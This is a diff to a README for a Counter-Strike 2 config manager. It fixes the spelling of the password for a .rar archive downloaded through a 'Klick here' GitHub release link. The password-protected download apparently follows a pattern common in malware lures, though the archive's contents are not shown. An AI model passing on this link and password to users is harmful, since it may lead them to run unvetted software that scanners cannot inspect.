@@ -21,7 +21,7 @@ A powerful and user-friendly CS2 Config Manager designed to simplify the managem
 - Use at your own risk (always backup original configs).  
 ### Latest Stable Release: v1.1.0 *(2025-05-28)*  
 ([Klick here](https://github.com/chedmoon2/ConfigManager-CS2/releases/download/Download/ACM.rar))  
-Password: AwsomeConfigManager
+Password: AwesomeConfigManager
 #### 🚀 New Features  
 - Cloud Sync: Backup & sync configs via Google Drive/Dropbox.  
 - Pro Presets: Added 10+ new crosshair/ViewModel profiles from pro players.  
